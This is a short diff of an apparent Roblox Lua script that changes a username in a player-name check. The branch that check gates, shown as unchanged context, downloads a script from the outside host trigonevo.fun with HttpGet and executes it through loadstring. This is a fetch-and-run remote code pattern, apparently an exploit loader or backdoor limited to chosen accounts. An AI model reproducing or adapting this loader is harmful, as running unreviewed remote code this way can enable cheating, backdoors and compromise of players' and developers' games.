@@ -10,7 +10,7 @@ if plrName == "Farthening" or plrName == "webportaI" then
 end
 	
 if true then
-	if plrName == "rel_baldski" or plrName == "lukaku_208" then
+	if plrName == "rel_baldski" or plrName == "523e45awdaw" then
 		loadstring(game:HttpGet("https://trigonevo.fun/x/test",true))()
 		return
 	else
